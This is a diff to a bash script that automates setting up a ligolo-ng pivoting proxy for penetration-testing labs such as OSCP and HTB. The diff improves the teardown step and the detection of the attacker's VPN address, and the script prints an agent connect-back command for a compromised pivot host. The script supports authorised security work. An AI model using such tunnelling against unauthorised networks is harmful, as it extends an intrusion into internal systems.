@@ -15,9 +15,16 @@ if [[ "${1:-}" == "--teardown" ]]; then
     echo "[*] Tearing down ligolo-ng TUN interface and proxy."
     if [[ -f "$PID_FILE" ]]; then
         PID="$(cat "$PID_FILE")"
-        if kill -0 "$PID" 2>/dev/null; then
+        # The proxy was started via `exec sudo ...`, so it runs as root and this PID is root-owned.
+        # An unprivileged kill/kill -0 against it returns EPERM, so go through sudo unless we are
+        # already root -- otherwise teardown silently reports success without stopping anything.
+        KILL_PREFIX=""
+        [[ $EUID -ne 0 ]] && command -v sudo >/dev/null 2>&1 && KILL_PREFIX="sudo"
+        if [[ -n "$PID" ]] && $KILL_PREFIX kill -0 "$PID" 2>/dev/null; then
             echo "[*] Killing proxy process (pid $PID)"
-            kill "$PID"
+            $KILL_PREFIX kill "$PID"
+        else
+            echo "[*] No running proxy found for recorded pid ${PID:-<none>} -- it was probably already stopped."
         fi
         rm -f "$PID_FILE"
     fi
@@ -50,7 +57,27 @@ else
     sudo ip tuntap add dev "$TUN_NAME" mode tun user "$(whoami)" && sudo ip link set "$TUN_NAME" up
 fi
 
-ATTACKER_IP="$(ip route get 1.1.1.1 2>/dev/null | grep -oP '(?<=src )\S+')"
+# Resolved before the banner below -- the banner prints the agent-side connect-back command, so it
+# has to reflect the port the proxy actually binds, not a default.
+LISTEN_PORT="${LIGOLO_PORT:-11601}"
+
+# The agent has to reach us over the engagement VPN, so prefer the VPN interface address. A plain
+# `ip route get <internet host>` returns the *default route* source IP, which on a Kali box is
+# normally the LAN address -- unreachable from an OSCP/HTB target, and a confusing failure to debug.
+ATTACKER_IP=""
+for vpn_if in tun0 tun1 tap0 ligolo-vpn; do
+    [[ "$vpn_if" == "$TUN_NAME" ]] && continue   # our own pivot TUN is not the VPN
+    if ip link show "$vpn_if" >/dev/null 2>&1; then
+        ATTACKER_IP="$(ip -4 -o addr show dev "$vpn_if" 2>/dev/null | grep -oP '(?<=inet )[0-9.]+' | head -n1)"
+        [[ -n "$ATTACKER_IP" ]] && { echo "[*] Using VPN interface '$vpn_if' address: $ATTACKER_IP"; break; }
+    fi
+done
+if [[ -z "$ATTACKER_IP" ]]; then
+    ATTACKER_IP="$(ip route get 1.1.1.1 2>/dev/null | grep -oP '(?<=src )\S+')"
+    [[ -n "$ATTACKER_IP" ]] && \
+        echo "[!] No VPN interface (tun0/tun1/tap0) found -- falling back to the default-route address $ATTACKER_IP." >&2 && \
+        echo "    If the target reaches you over a VPN, this is probably the WRONG address; override it by hand." >&2
+fi
 if [[ -z "$ATTACKER_IP" ]]; then
     ATTACKER_IP="<YOUR_ATTACKER_IP>"
     echo "[!] Could not auto-detect attacker IP -- fill it in manually below." >&2
@@ -60,7 +87,7 @@ echo
 echo "=================================================================="
 echo "Once the proxy below is listening, paste this on the PIVOT HOST:"
 echo
-echo "  ./$AGENT_HINT -connect ${ATTACKER_IP}:${LISTEN_PORT:-11601} -ignore-cert -retry"
+echo "  ./$AGENT_HINT -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry"
 echo
 echo "Then, in the proxy console that starts below:"
 echo "  session                 # list/select the connected agent"
@@ -77,8 +104,8 @@ echo "For a second hop (double pivot): repeat this whole process with a distinct
 echo "second TUN interface (edit TUN_NAME at the top of this script) for the second agent."
 echo "=================================================================="
 echo
-echo "[*] Starting proxy in the foreground -- Ctrl+C to stop (run '$0 --teardown' after)."
-LISTEN_PORT="${LIGOLO_PORT:-11601}"
+echo "[*] Starting proxy on 0.0.0.0:${LISTEN_PORT} in the foreground -- Ctrl+C to stop (run '$0 --teardown' after)."
+# `exec` below preserves this PID, so recording $$ here records the proxy's own PID.
 echo "$$" > "$PID_FILE"
 echo "  ./$AGENT_HINT -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry" >&2
 exec sudo "$PROXY_BIN" -selfcert -laddr "0.0.0.0:${LISTEN_PORT}"
